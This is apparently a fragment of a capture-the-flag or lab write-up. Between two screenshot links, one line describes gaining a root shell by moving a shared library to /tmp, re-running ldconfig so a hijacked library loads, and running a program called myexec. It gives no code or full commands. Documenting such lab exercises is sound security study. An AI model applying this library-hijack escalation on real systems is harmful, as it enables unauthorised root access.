![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549226178706_image.png)


move printf libseclogin.so to /tmp re-run ldconfig and open myexec straight to a root shell!

![](https://d2mxuefqeaa7sj.cloudfront.net/s_0F0B85F4AA869BFDB6CB3BC5BCB4F0577A23E4F1A4945DFCAB31D40EAAB5338B_1549226263371_image.png)


TADA!


